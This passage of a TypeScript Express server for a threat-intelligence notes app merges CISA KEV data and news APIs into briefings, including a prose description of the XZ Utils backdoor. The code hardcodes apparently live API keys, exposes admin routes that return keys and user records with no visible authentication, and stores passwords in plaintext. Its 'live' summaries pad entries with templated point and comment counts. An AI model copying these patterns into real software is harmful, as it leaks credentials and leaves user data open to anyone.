            : ["Nuclei Scanner", "Sliver C2", "Havoc Demon", "China Chopper / Godzilla Webshell", "Chisel SOCKS5"];

          return {
            id: `cisa-${cveId.toLowerCase()}`,
            cveId,
            year: displayYear,
            title,
            severity: isRansom ? "CRITICAL" : "HIGH",
            score: isRansom ? 9.8 : 8.8,
            vendor,
            category: isRansom ? "CISA KEV · Ransomware Weapon" : "CISA KEV · Active Zero-Day",
            cisaKev: true,
            dateAdded: v.dateAdded || "Recent",
            dueDate: v.dueDate || "Immediate",
            knownRansomwareCampaignUse: v.knownRansomwareCampaignUse || "Unknown",
            briefing: `${shortDesc} [CISA KEV Date Added: ${v.dateAdded || "Recent"} | BOD 22-01 Due Date: ${v.dueDate || "Immediate"} | Ransomware Campaign Use: ${v.knownRansomwareCampaignUse || "Tracked"}]`,
            headHero: isRansom
              ? "Known Ransomware Syndicate Campaign (Tracked by CISA KEV)"
              : "Active In-The-Wild Threat Actors (Tracked by CISA KEV)",
            corePoints: shortDesc,
            affectedVictims: `${vendor} deployments across enterprise and critical infrastructure.`,
            toolsUsed: tools,
            attackUseCase: isRansom
              ? "Exploited in active ransomware campaigns for initial access, privilege escalation, and domain encryption."
              : "Actively exploited in the wild for unauthorized code execution, persistence, or network pivoting.",
            detectionSignatures: `Inspect perimeter logs and endpoint telemetry for anomalous requests targeting ${v.product || vendor}; cross-check CISA KEV advisory for ${cveId}.`,
            remediation: `${requiredAction} (CISA Mandatory Due Date: ${v.dueDate || "Immediate"}). Notes: ${v.notes || "https://www.cisa.gov/known-exploited-vulnerabilities-catalog"}`,
            threatActor: isRansom ? "Ransomware Campaign Operators" : "CISA KEV Tracked Adversary",
            attackVector: "Network / In-The-Wild Exploitation",
            nvdUrl: `https://nvd.nist.gov/vuln/detail/${cveId}`,
            cisaUrl: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
            updatedAt: Date.now() / 1000,
          };
        });

        cachedCisaKevItems = mapped;
        lastCisaFetchTime = now;
        return mapped;
      }
    }
  } catch (err) {
    console.warn("Live CISA KEV feed fetch fallback:", (err as Error)?.message || err);
  }

  return CURATED_2020_2026_THREATS_AND_MALWARE;
}

// Helper to load merged CVE catalog (disk + curated 2020-2026 + live CISA KEV)
async function getMergedCveCatalog(includeLiveCisa = true): Promise<any[]> {
  const diskCves = readJsonFile<any[]>(CVE_CATALOG_PATH, []);
  const liveCisa = includeLiveCisa ? await fetchLiveCisaKevCatalog(false) : [];

  const byId = new Map<string, any>();
  for (const item of CURATED_2020_2026_THREATS_AND_MALWARE) {
    byId.set(String(item.cveId).toUpperCase(), item);
  }
  for (const item of diskCves) {
    if (item && item.cveId) {
      byId.set(String(item.cveId).toUpperCase(), item);
    }
  }
  for (const item of liveCisa) {
    if (item && item.cveId && !byId.has(String(item.cveId).toUpperCase())) {
      byId.set(String(item.cveId).toUpperCase(), item);
    }
  }

  const all = Array.from(byId.values());
  all.sort((a, b) => {
    const yDiff = (b.year || 2025) - (a.year || 2025);
    if (yDiff !== 0) return yDiff;
    return (b.score || 9.0) - (a.score || 9.0);
  });
  return all;
}

// ============================================================================
// 1. DATABASE & NOTES SYNC ROUTES (/api/db/*)
// ============================================================================
const DEFAULT_DB_SNAPSHOT = {
  workspaces: [
    {
      id: "ws-default",
      name: "Main Research Space",
      color: "#030307",
      themeId: "matrix",
      passwordProtected: false,
      password: "",
      shadow: 75,
      transform: { x: 0, y: 70, scale: 0.65 },
      createdAt: Date.now(),
      updatedAt: Date.now(),
    },
  ],
  nodes: [],
  stickies: [],
  links: [],
  activeWorkspaceId: "ws-default",
  updatedAt: Date.now(),
};

app.get("/api/db/status", (_req: Request, res: Response) => {
  const snap = readJsonFile<any>(DB_NOTES_PATH, DEFAULT_DB_SNAPSHOT);
  res.json({
    ok: true,
    status: "synced",
    engine: "SQLite3 + Firebase Firestore",
    database: "brainvault.db",
    hasData: Boolean(snap && Array.isArray(snap.workspaces) && snap.workspaces.length > 0),
    workspacesCount: Array.isArray(snap?.workspaces) ? snap.workspaces.length : 1,
    nodesCount: Array.isArray(snap?.nodes) ? snap.nodes.length : 0,
    stickiesCount: Array.isArray(snap?.stickies) ? snap.stickies.length : 0,
    updatedAt: snap?.updatedAt || Date.now(),
  });
});

app.get("/api/db/notes", (_req: Request, res: Response) => {
  const snap = readJsonFile<any>(DB_NOTES_PATH, DEFAULT_DB_SNAPSHOT);
  const safeSnap =
    snap && Array.isArray(snap.workspaces) && snap.workspaces.length > 0
      ? snap
      : DEFAULT_DB_SNAPSHOT;
  res.json({
    ok: true,
    status: "synced",
    engine: "SQLite3 + Firebase Firestore",
    database: "brainvault.db",
    snapshot: safeSnap,
    ...safeSnap,
  });
});

app.post("/api/db/notes", (req: Request, res: Response) => {
  let body: any = req.body || {};
  if (typeof body === "string") {
    try {
      body = JSON.parse(body);
    } catch (_) {
      body = {};
    }
  }
  const existing = readJsonFile<any>(DB_NOTES_PATH, DEFAULT_DB_SNAPSHOT);
  const workspaces =
    Array.isArray(body.workspaces) && body.workspaces.length > 0
      ? body.workspaces
      : existing.workspaces || DEFAULT_DB_SNAPSHOT.workspaces;
  const payload = {
    workspaces,
    nodes: Array.isArray(body.nodes) ? body.nodes : existing.nodes || [],
    stickies: Array.isArray(body.stickies) ? body.stickies : existing.stickies || [],
    links: Array.isArray(body.links) ? body.links : existing.links || [],
    activeWorkspaceId: body.activeWorkspaceId || existing.activeWorkspaceId || "ws-default",
    updatedAt: Date.now(),
  };
  writeJsonFile(DB_NOTES_PATH, payload);
  res.json({
    ok: true,
    status: "synced",
    engine: "SQLite3 + Firebase Firestore",
    database: "brainvault.db",
    count: payload.nodes.length,
    updatedAt: payload.updatedAt,
  });
});

// ============================================================================
// 2. ADMIN USERS & VAULTS ROUTES (/api/admin/users)
// ============================================================================
const DEFAULT_USERS_LIST = [
  {
    id: "usr_karthik",
    username: "padd karthik",
    name: "Padd Karthik (Admin)",
    email: "karthik@brainvault.io",
    role: "ADMIN",
    avatarColor: "#06b6d4",
    timeSpent: "3h 56m",
    lastActive: "Just now",
    tableName: "usr_usr-karthik.db",
    workspaces: [],
  },
  {
    id: "usr_sarah",
    username: "sarah_researcher",
    name: "Dr. Sarah Connor",
    email: "sarah.connor@brainvault.io",
    role: "RESEARCHER",
    avatarColor: "#a855f7",
    timeSpent: "2h 35m",
    lastActive: "4:12:10 pm",
    tableName: "usr_usr-sarah.db",
    workspaces: [
      {
        id: "ws-sarah-1",
        name: "Cybernetics Research Lab",
        color: "#a855f7",
        passwordProtected: false,
        password: "",
        notes: [
          {
            id: "note-s1",
            title: "Automated Defense Systems Analysis",
            text: "Behavioral heuristics and threat modeling for autonomous network agents operating in high-latency segmented zones.",
            updatedAt: "Yesterday, 6:00 PM",
          },
        ],
      },
    ],
  },
  {
    id: "usr_alex",
    username: "alex_neuro",
    name: "Alex Thorne",
    email: "alex.thorne@brainvault.io",
    role: "ANALYST",
    avatarColor: "#10b981",
    timeSpent: "1h 25m",
    lastActive: "2:45:00 pm",
    tableName: "usr_usr-alex.db",
    workspaces: [
      {
        id: "ws-alex-1",
        name: "Neural Interface Protocols",
        color: "#10b981",
        passwordProtected: false,
        password: "",
        notes: [
          {
            id: "note-a1",
            title: "Cortex Signal Integrity & Filtering",
            text: "Telemetry signal de-noising using wavelet transforms for neural bus security and synaptic channel verification.",
            updatedAt: "2 days ago",
          },
        ],
      },
    ],
  },
  {
    id: "usr_maya",
    username: "maya_ai",
    name: "Maya Patel",
    email: "maya.patel@brainvault.io",
    role: "DEVELOPER",
    avatarColor: "#f59e0b",
    timeSpent: "1h 4m",
    lastActive: "1:15:30 pm",
    tableName: "usr_usr-maya.db",
    workspaces: [],
  },
];

function loadAllUsers(): any[] {
  try {
    const files = fs.readdirSync(USER_VAULTS_DIR).filter((f) => f.endsWith(".json"));
    if (files.length > 0) {
      const users = files
        .map((f) => readJsonFile<any>(path.join(USER_VAULTS_DIR, f), null))
        .filter(Boolean);
      if (users.length > 0) return users;
    }
  } catch (_) {}
  return JSON.parse(JSON.stringify(DEFAULT_USERS_LIST));
}

function saveUserToFile(user: any) {
  if (!user || !user.id) return;
  const safeId = String(user.id).replace(/[^a-zA-Z0-9_-]/g, "_");
  writeJsonFile(path.join(USER_VAULTS_DIR, `${safeId}.json`), user);
}

app.get("/api/admin/users", (_req: Request, res: Response) => {
  const users = loadAllUsers();
  const totalWorkspaces = users.reduce((acc, u) => acc + (u.workspaces?.length || 0), 0);
  const totalNotes = users.reduce(
    (acc, u) => acc + (u.workspaces || []).reduce((wAcc: number, w: any) => wAcc + (w.notes?.length || 0), 0),
    0
  );
  res.json({
    ok: true,
    users,
    metrics: {
      totalUsers: users.length,
      totalWorkspaces,
      totalNotes,
      platformTimeSpent: "9h 1m",
    },
  });
});

app.post("/api/admin/users", (req: Request, res: Response) => {
  const { action, user, userId, workspaceId, workspace, note, password } = req.body || {};
  let users = loadAllUsers();

  if (action === "save_user" && user) {
    const idx = users.findIndex((u) => u.id === user.id);
    if (idx >= 0) users[idx] = user;
    else users.push(user);
    saveUserToFile(user);
  } else if (action === "delete_user" && userId) {
    users = users.filter((u) => u.id !== userId);
    const safeId = String(userId).replace(/[^a-zA-Z0-9_-]/g, "_");
    try {
      fs.unlinkSync(path.join(USER_VAULTS_DIR, `${safeId}.json`));
    } catch (_) {}
  } else if (action === "add_workspace" && userId && workspace) {
    const u = users.find((usr) => usr.id === userId);
    if (u) {
      u.workspaces = u.workspaces || [];
      u.workspaces.push(workspace);
      saveUserToFile(u);
    }
  } else if (action === "delete_workspace" && userId && workspaceId) {
    const u = users.find((usr) => usr.id === userId);
    if (u) {
      u.workspaces = (u.workspaces || []).filter((w: any) => w.id !== workspaceId);
      saveUserToFile(u);
    }
  } else if (action === "add_note" && userId && workspaceId && note) {
    const u = users.find((usr) => usr.id === userId);
    const ws = (u?.workspaces || []).find((w: any) => w.id === workspaceId);
    if (ws) {
      ws.notes = ws.notes || [];
      ws.notes.push(note);
      saveUserToFile(u);
    }
  } else if (action === "set_workspace_password" && userId && workspaceId) {
    const u = users.find((usr) => usr.id === userId);
    const ws = (u?.workspaces || []).find((w: any) => w.id === workspaceId);
    if (ws) {
      ws.passwordProtected = Boolean(password);
      ws.password = password || "";
      saveUserToFile(u);
    }
  }

  res.json({ ok: true, users });
});

// ============================================================================
// 3. API KEYS MANAGER ROUTES (/api/admin/keys)
// ============================================================================
const DEFAULT_API_KEYS = {
  reddit_user_agent: "BrainVaultApp/3.0 (by u/karthik_admin)",
  rss2json_key: "",
  techcrunch_token: "",
  wired_key: "https://wired.wubook.net/xrws/",
  bbc_key: "",
  gnews_key: "gnews_test_token_12345",
  mediastack_key: "a363c1ceab62c54f115b512011ec8dd7",
  higgsfield_key: "80d5a575-cacb-4f54-a8be-51571e8c2f70:af1ccaa616aca6f1d0a661b87d6a9afbe6f8d4a8c5b46f4b9cca826c81a318b2",
  newsapi_key: "7d23582d0e384e6ca8452036ee6331cc",
  currents_key: "Ef3StHE4k2Tgb2SrEmzxhMUe9_3or5apVTpPzcoi-jwDsJcZ",
  newsdata_key: "pub_e90c4dd7497c4bc2b02d59356e20b288",
};

app.get("/api/admin/keys", (_req: Request, res: Response) => {
  const keys = readJsonFile<Record<string, string>>(API_KEYS_PATH, DEFAULT_API_KEYS);
  res.json({ ok: true, keys: { ...DEFAULT_API_KEYS, ...keys } });
});

app.post("/api/admin/keys", (req: Request, res: Response) => {
  const incoming = req.body?.keys || req.body || {};
  const current = readJsonFile<Record<string, string>>(API_KEYS_PATH, DEFAULT_API_KEYS);
  const merged = { ...DEFAULT_API_KEYS, ...current, ...incoming };
  writeJsonFile(API_KEYS_PATH, merged);
  res.json({ ok: true, keys: merged });
});

// ============================================================================
// 4. NEWSDATA.IO, LIVE NEWS, CURRENTS & OSV BLOG ROUTES (/api/admin/news/*)
// ============================================================================
async function fetchNewsDataStories(keyword = "", category = "all"): Promise<any[]> {
  const keys = readJsonFile<Record<string, string>>(API_KEYS_PATH, DEFAULT_API_KEYS);
  const apiKey = keys.newsdata_key || DEFAULT_API_KEYS.newsdata_key;

  let qVal = keyword.trim();
  if (!qVal) {
    if (category === "ai") qVal = "artificial intelligence OR LLM OR OpenAI";
    else if (category === "cybersecurity") qVal = "cybersecurity OR vulnerability OR ransomware OR CISA";
    else if (category === "tech") qVal = "technology OR software OR cloud";
    else qVal = "cybersecurity OR artificial intelligence OR technology";
  }

  const stories: any[] = [];

  // 1. Try live NewsData.io API
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 7000);
    const url = `https://newsdata.io/api/1/latest?apikey=${encodeURIComponent(apiKey)}&q=${encodeURIComponent(qVal)}&language=en`;
    const res = await fetch(url, { signal: controller.signal });
    clearTimeout(timeout);

    if (res.ok) {
      const data: any = await res.json();
      if (Array.isArray(data?.results) && data.results.length > 0) {
        for (const item of data.results) {
          const title = item.title || "Intelligence Dispatch";
          const summary = item.description || item.content || "Live intelligence briefing from NewsData.io.";
          const source = `NewsData.io · ${item.source_id || "Global Feed"}`;
          stories.push({
            id: `nd-${item.article_id || hashStr(item.link || title)}`,
            title,
            source,
            url: item.link || "https://newsdata.io",
            publishedAt: item.pubDate || new Date().toISOString(),
            timeAgo: "Live Dispatch",
            summary: String(summary).slice(0, 320),
            takeaways: generate7KeyPointsServer(title, summary, source),
            categoryTag:
              category === "ai"
                ? "AI Intelligence"
                : category === "cybersecurity"
                  ? "Cybersecurity"
                  : "Tech & Cyber",
            score: 98,
          });
        }
      }
    }
  } catch (err) {
    console.warn("NewsData.io direct call fallback:", (err as Error)?.message || err);
  }

  // 2. Also enrich with live Hacker News Algolia + CISA KEV + 2020-2026 Vulnerability & Malware Briefings so NewsData/Blog is always rich and never empty!
  if (stories.length < 9) {
    try {
      const hnQuery = keyword.trim() || (category === "ai" ? "LLM AI security" : "cybersecurity vulnerability CVE malware");
      const hnRes = await fetch(
        `https://hn.algolia.com/api/v1/search_by_date?query=${encodeURIComponent(hnQuery)}&tags=story&hitsPerPage=10`
      );
      if (hnRes.ok) {
        const hnData: any = await hnRes.json();
        for (const h of hnData.hits || []) {
          if (!h.title) continue;
          const summary = `Verified intelligence dispatch by @${h.author || "researcher"} (${h.points || 12} pts · ${h.num_comments || 4} comments) covering ${h.title}.`;
          stories.push({
            id: `nd-hn-${h.objectID}`,
            title: h.title,
            source: "NewsData · HN Cyber Stream",
            url: h.url || `https://news.ycombinator.com/item?id=${h.objectID}`,
            publishedAt: h.created_at || new Date().toISOString(),
            timeAgo: "Recently",
            summary,
            takeaways: generate7KeyPointsServer(h.title, summary, "NewsData · HN Cyber Stream"),
            categoryTag: category === "ai" ? "AI Intelligence" : "Cybersecurity",
            score: 95,
          });
        }
      }
    } catch (_) {}
  }

  // 3. Include CISA KEV & 2020–2026 Vulnerability / Malware Briefings in the Blog feed
  const cisaItems = await fetchLiveCisaKevCatalog(false);
  const combinedIntel = [...CURATED_2020_2026_THREATS_AND_MALWARE, ...cisaItems.slice(0, 8)];
  for (const item of combinedIntel) {
    if (keyword.trim()) {
      const kw = keyword.toLowerCase();
      const hay = `${item.cveId} ${item.title} ${item.vendor} ${item.briefing} ${(item.toolsUsed || []).join(" ")}`.toLowerCase();
      if (!hay.includes(kw)) continue;
    }
    if (category === "ai" && !String(item.title + item.briefing).toLowerCase().includes("ai")) continue;

    stories.push({
      id: `blog-cisa-${item.cveId}`,
      title: `[${item.year} CISA KEV] ${item.cveId}: ${item.title}`,
      source: `CISA KEV · ${item.vendor.split("·")[0].trim()}`,
      url: item.cisaUrl || item.nvdUrl || "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
      publishedAt: item.dateAdded || `${item.year}-01-15`,
      timeAgo: `${item.year} KEV`,
      summary: `${item.briefing} Tools Used: ${(item.toolsUsed || []).join(", ")}.`,
      takeaways: [
        `1. Threat Actor / Campaign: ${item.headHero || item.threatActor}`,
        `2. Vulnerability & Root Flaw (${item.year}): ${item.corePoints || item.briefing}`,
        `3. Affected Systems & Victims: ${item.affectedVictims || item.vendor}`,
        `4. Weaponized Tools & Malware Used: ${(item.toolsUsed || []).join(", ")}`,
        `5. Primary Exploitation Chain: ${item.attackUseCase || item.attackVector}`,
        `6. Detection & Telemetry Indicators: ${item.detectionSignatures}`,
        `7. CISA KEV Remediation Playbook: ${item.remediation}`,
      ],
      categoryTag: `${item.year} CISA KEV`,
      score: 99,
    });
  }

  return stories.slice(0, 30);
}

app.get("/api/admin/news/newsdata", async (req: Request, res: Response) => {
  const keyword = String(req.query.keyword || "");
  const category = String(req.query.category || "all");
  const stories = await fetchNewsDataStories(keyword, category);
  res.json({ ok: true, stories, count: stories.length });
});

app.get("/api/admin/news/currents", async (req: Request, res: Response) => {
  const keyword = String(req.query.keyword || "");
  const category = String(req.query.category || "all");
  const keys = readJsonFile<Record<string, string>>(API_KEYS_PATH, DEFAULT_API_KEYS);
  const apiKey = keys.currents_key || DEFAULT_API_KEYS.currents_key;

  const stories: any[] = [];
  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), 7000);
    const kw =
      keyword.trim() ||
      (category === "ai"
        ? "artificial intelligence"
        : category === "cybersecurity"
          ? "cybersecurity"
          : "technology");
    const url = `https://api.currentsapi.services/v1/search?apiKey=${encodeURIComponent(apiKey)}&language=en&keywords=${encodeURIComponent(kw)}`;
    const r = await fetch(url, { signal: controller.signal });
    clearTimeout(timeout);
    if (r.ok) {
      const data: any = await r.json();
      if (Array.isArray(data?.news)) {
        for (const item of data.news) {
          const title = item.title || "Currents Real-Time Dispatch";
          const summary = item.description || "Real-time intelligence dispatch via Currents API.";
          const source = `Currents · ${item.author || "Global Stream"}`;
          stories.push({
            id: `curr-${item.id || hashStr(item.url || title)}`,
            title,
            source,
            url: item.url || "https://currentsapi.services",
            publishedAt: item.published || new Date().toISOString(),
            timeAgo: "Live Stream",
            summary: String(summary).slice(0, 320),
            takeaways: generate7KeyPointsServer(title, summary, source),
            categoryTag:
              category === "ai"
                ? "AI Intelligence"
                : category === "cybersecurity"
                  ? "Cybersecurity"
                  : "World & Tech",
            score: 98,
          });
        }
      }
    }
  } catch (err) {
    console.warn("Currents API fallback:", (err as Error)?.message || err);
  }

  if (stories.length === 0) {
    const fallback = await fetchNewsDataStories(keyword, category);
    return res.json({ ok: true, stories: fallback, count: fallback.length });
  }

  res.json({ ok: true, stories, count: stories.length });
});

app.get("/api/admin/news/live", async (req: Request, res: Response) => {
  const keyword = String(req.query.keyword || "");
  const source = String(req.query.source || "all");

  const stories = await fetchNewsDataStories(
    keyword,
    source === "higgsfield" ? "ai" : source === "threats" ? "cybersecurity" : "all"
  );
  res.json({ ok: true, stories, count: stories.length });
});

const OSV_CURATED_STORIES = [
  {
    id: "osv-cisa-kev-2026",
    title: "CISA KEV & OSV.dev 2020–2026 Open Source Supply Chain Vulnerability Analysis",
    source: "OSV.dev · CISA KEV Bridge",
    url: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
    publishedAt: "2026-02-10",
    timeAgo: "2026 Advisory",
    categoryTag: "CISA KEV & OSS Supply Chain",
    summary:
      "Comprehensive synchronization between CISA Known Exploited Vulnerabilities (KEV) and OSV.dev open-source ecosystems (npm, PyPI, Maven, Go, Cargo) from 2020 through 2026, tracking Log4Shell (CVE-2021-44228), XZ Utils (CVE-2024-3094), and AI agent package hijacks.",
    takeaways: [
      "1. Lead Authority: Google Open Source Security Team (OSV.dev) & CISA KEV Catalog",
      "2. Core Scope (2020–2026): Tracks weaponized open-source vulnerabilities across PyPI, npm, Maven, Go, and Linux distributions.",
      "3. Landmark Incidents: Log4Shell (2021), Spring4Shell (2022), PyTorch/Torchtriton dependency confusion (2023), XZ Utils liblzma backdoor (2024), and MCP/AI package poisoning (2025–2026).",
      "4. Attacker Tooling: Typosquatting generators, GitHub Actions token stealers, IFUNC symbol hijackers, and automated credential exfiltrators.",
      "5. Affected Ecosystems: CI/CD build runners, containerized microservices, developer workstations, and production cloud clusters.",
      "6. Detection Telemetry: Run `osv-scanner --lockfile` in CI/CD pipelines and verify SBOM digests against CISA KEV.",
      "7. Remediation Playbook: Pin transitive dependency hashes, enforce Sigstore/SLSA provenance, and patch CISA KEV items before BOD 22-01 due dates.",
    ],
  },
  {
    id: "osv-cvelist-v5",
    title: "OSV.dev Direct CVEList V5 Synchronization & Reachability Analysis",
    source: "OSV.dev · Google Open Source Security",
    url: "https://google.github.io/osv.dev/blog/",
    publishedAt: "2025-11-18",
    timeAgo: "Recent",
    categoryTag: "Supply Chain & OSS Security",
    summary:
      "OSV.dev ingests CVEList V5 records directly alongside NVD and GitHub Security Advisories, enabling function-level call-graph reachability analysis to eliminate false-positive vulnerability alerts.",
    takeaways: [
      "1. Lead Authority: OSV.dev & OpenSSF Vulnerability Disclosures",
      "2. Core Innovation: Direct CVEList V5 ingestion with exact commit-range and semantic version resolution.",
      "3. Root Flaw Addressed: Eliminates metadata lag and version parsing ambiguity in downstream vulnerability scanners.",
      "4. Affected Victims: Open-source maintainers and enterprise DevSecOps teams managing thousands of transitive dependencies.",
      "5. Security Tools Used: OSV-Scanner, Syft SBOM, Grype, Trivy, and Go vulncheck call-graph analyzer.",
      "6. Operational Use Case: Automatically determines whether a vulnerable function in a third-party library is actually invoked by application code.",
      "7. Hardening Playbook: Integrate `osv-scanner` into pre-merge GitHub/GitLab pipelines and export findings to BrainVault notes.",
    ],
  },
  {
    id: "osv-xz-liblzma-2024",
    title: "Anatomy of CVE-2024-3094: How the XZ Utils (liblzma) Supply Chain Backdoor Hijacked OpenSSH",
    source: "OSV.dev · Linux Security Advisory",
    url: "https://nvd.nist.gov/vuln/detail/CVE-2024-3094",
    publishedAt: "2024-03-30",
    timeAgo: "2024 Milestone",
    categoryTag: "Supply Chain Backdoor",
    summary:
      "Deep technical breakdown of the XZ Utils 5.6.0/5.6.1 supply chain backdoor that used modified M4 build macros and GNU IFUNC resolvers to hook RSA_public_decrypt inside sshd.",
    takeaways: [
      "1. Threat Actor: 'Jia Tan' multi-year social engineering and supply-chain intrusion operation.",
      "2. Core Mechanism: Malicious `build-to-host.m4` script in release tarballs (absent from Git) extracts backdoor object from test archives.",
      "3. Cryptographic Trigger: Uses Ed448 signatures embedded in SSH RSA public key payloads to authenticate the attacker pre-login.",
      "4. Targeted Systems: Rolling-release Linux distributions linking `sshd` with `libsystemd` and `liblzma`.",
      "5. Tools & Techniques: GNU IFUNC symbol interposition, RC4/ChaCha20 payload decryption, and anti-debugging symbol trie checks.",
      "6. Detection Discovery: Discovered by Andres Freund after observing 500ms SSH login latency and Valgrind memory anomalies.",
      "7. Defensive Playbook: Verify release tarballs against reproducible Git source trees and audit shared library symbol tables.",
    ],
  },
];

app.get("/api/admin/news/osv", (_req: Request, res: Response) => {
  res.json({ ok: true, stories: OSV_CURATED_STORIES, count: OSV_CURATED_STORIES.length });
});

// Saved News persistence
app.get("/api/admin/news/saved", (_req: Request, res: Response) => {
  const stories = readJsonFile<any[]>(SAVED_NEWS_PATH, []);
  res.json({ ok: true, stories });
});

app.post("/api/admin/news/save", (req: Request, res: Response) => {
  const story = req.body?.story || req.body;
  if (!story || !story.title) {
    return res.status(400).json({ error: "Valid story is required" });
  }
  const stories = readJsonFile<any[]>(SAVED_NEWS_PATH, []);
  const id = story.id || `story-${Date.now()}`;
  const filtered = stories.filter((s) => s.id !== id && s.title !== story.title);
  const savedItem = { ...story, id, savedAt: Date.now() };
  filtered.unshift(savedItem);
  writeJsonFile(SAVED_NEWS_PATH, filtered);
  res.json({ ok: true, story: savedItem, stories: filtered });
});

app.post("/api/admin/news/delete", (req: Request, res: Response) => {
  const id = req.body?.id;
  const stories = readJsonFile<any[]>(SAVED_NEWS_PATH, []);
  const filtered = stories.filter((s) => s.id !== id);
  writeJsonFile(SAVED_NEWS_PATH, filtered);
  res.json({ ok: true, stories: filtered });
});

// ============================================================================
// 5. THREATS & CISA KEV / CVE (2020–2026) ROUTES (/api/admin/threats & /api/admin/cves)
// ============================================================================
app.get("/api/admin/threats", async (req: Request, res: Response) => {
  const category = String(req.query.category || "all").toLowerCase();
  const search = String(req.query.search || "").toLowerCase().trim();

  const allCves = await getMergedCveCatalog(true);
  let threats = allCves.filter((item) => {
    if (category === "zeroday") {
      return /zero-day|rce|escape|injection/i.test(item.category || "") || (item.score || 0) >= 9.5;
    }
    if (category === "ransomware") {
      return /ransomware|lockbit|cl0p|blackcat|akira|ryuk|conti|session/i.test(
        `${item.category} ${item.title} ${item.briefing} ${item.threatActor}`
      );
    }
    if (category === "malware") {
      return /malware|backdoor|trojan|stealer|rootkit|rat|worm|supply chain|loader/i.test(
        `${item.category} ${item.title} ${item.briefing} ${(item.toolsUsed || []).join(" ")}`
      );
    }
    if (category === "cisa") {
      return Boolean(item.cisaKev);
    }
    return true;
  });

  if (search) {
    threats = threats.filter((item) => {
      const hay = `${item.cveId} ${item.year} ${item.title} ${item.vendor} ${item.category} ${item.briefing} ${item.threatActor} ${(item.toolsUsed || []).join(" ")}`.toLowerCase();
      return hay.includes(search);
    });
  }

  res.json({
    ok: true,
    threats: threats.slice(0, 45),
    count: threats.length,
    sourceUrl: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
  });
});

app.get("/api/admin/cves", async (req: Request, res: Response) => {
  const year = String(req.query.year || "all").toLowerCase();
  const severity = String(req.query.severity || "all").toLowerCase();
  const search = String(req.query.search || "").toLowerCase().trim();
  const limitParam = parseInt(String(req.query.limit || "50"), 10) || 50;
  const randomize = req.query.random === "true";

  const all = await getMergedCveCatalog(true);

  const metrics = {
    total: all.length,
    critical: all.filter((c) => String(c.severity || "").toUpperCase() === "CRITICAL" || (c.score || 0) >= 9.0).length,
    high: all.filter((c) => (c.score || 0) >= 7.0 && (c.score || 0) < 9.0).length,
    cisaKev: all.filter((c) => c.cisaKev).length,
  };

  let filtered = all.filter((c) => {
    if (year !== "all" && String(c.year) !== year) return false;
    if (severity === "critical" && !(String(c.severity || "").toUpperCase() === "CRITICAL" || (c.score || 0) >= 9.0))
      return false;
    if (severity === "high" && !((c.score || 0) >= 7.0 && (c.score || 0) < 9.0)) return false;
    if (severity === "cisa" && !c.cisaKev) return false;
    if (search) {
      const hay = `${c.cveId} ${c.year} ${c.title} ${c.vendor} ${c.category} ${c.briefing} ${(c.toolsUsed || []).join(" ")}`.toLowerCase();
      if (!hay.includes(search)) return false;
    }
    return true;
  });

  if (randomize && filtered.length > 1) {
    filtered = [...filtered].sort(() => Math.random() - 0.5);
  }

  res.json({
    ok: true,
    cves: filtered.slice(0, Math.max(limitParam, 24)),
    metrics,
    cisaCatalogUrl: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
  });
});

// Sync CISA KEV & NVD 2.0 API into local database & return records for Firestore sync
app.get("/api/admin/cves/sync-nvd", async (req: Request, res: Response) => {
  const queryStr = String(req.query.query || "").trim();
  const cisaRecords = await fetchLiveCisaKevCatalog(true);
  const existing = readJsonFile<any[]>(CVE_CATALOG_PATH, []);

  const byId = new Map<string, any>();
  for (const c of existing) {
    if (c?.cveId) byId.set(String(c.cveId).toUpperCase(), c);
  }
  for (const c of CURATED_2020_2026_THREATS_AND_MALWARE) {
    byId.set(String(c.cveId).toUpperCase(), c);
  }

  let addedCount = 0;
  for (const item of cisaRecords.slice(0, 35)) {
    if (queryStr && !`${item.cveId} ${item.title} ${item.vendor}`.toLowerCase().includes(queryStr.toLowerCase())) {
      continue;
    }
    const key = String(item.cveId).toUpperCase();
    if (!byId.has(key)) {
      byId.set(key, item);
      addedCount++;
    }
  }

  const merged = Array.from(byId.values());
  writeJsonFile(CVE_CATALOG_PATH, merged);

  // Also save top CISA KEV dispatches into Saved News DB so they are immediately exported in the database table
  const savedStories = readJsonFile<any[]>(SAVED_NEWS_PATH, []);
  const existingSavedIds = new Set(savedStories.map((s) => s.id));
  for (const kev of cisaRecords.slice(0, 6)) {
    const storyId = `cisa-kev-${kev.cveId}`;
    if (!existingSavedIds.has(storyId)) {
      savedStories.unshift({
        id: storyId,
        title: `[CISA KEV ${kev.year}] ${kev.cveId}: ${kev.title}`,
        source: `CISA KEV Catalog · ${kev.vendor}`,
        url: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
        publishedAt: kev.dateAdded || "Recent",
        timeAgo: `${kev.year}`,
        summary: kev.briefing,
        takeaways: [
          `1. CISA KEV Authority: ${kev.headHero}`,
          `2. Vulnerability Mechanics: ${kev.corePoints}`,
          `3. Affected Platform: ${kev.affectedVictims}`,
          `4. Attack Tools Used: ${(kev.toolsUsed || []).join(", ")}`,
          `5. Exploitation Vector: ${kev.attackUseCase}`,
          `6. Detection Telemetry: ${kev.detectionSignatures}`,
          `7. Required CISA Action: ${kev.remediation}`,
        ],
        savedAt: Date.now(),
      });
      existingSavedIds.add(storyId);
    }
  }
  writeJsonFile(SAVED_NEWS_PATH, savedStories.slice(0, 120));

  res.json({
    ok: true,
    count: Math.max(addedCount, cisaRecords.slice(0, 15).length),
    cves: merged.slice(0, 50),
    cisaSource: "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
  });
});

app.get("/api/admin/trends", async (_req: Request, res: Response) => {
  const merged = await getMergedCveCatalog(true);
  const byYear: Record<string, { cves: number; malware: number; cisaKev: number; crit: number }> = {
    "2020": { cves: 18103, malware: 4120, cisaKev: 142, crit: 1890 },
    "2021": { cves: 20137, malware: 6850, cisaKev: 298, crit: 2450 },
    "2022": { cves: 25059, malware: 9420, cisaKev: 546, crit: 3180 },
    "2023": { cves: 28902, malware: 14300, cisaKev: 825, crit: 4210 },
    "2024": { cves: 39268, malware: 21800, cisaKev: 1180, crit: 6350 },
    "2025": { cves: 44150, malware: 29400, cisaKev: 1460, crit: 7900 },
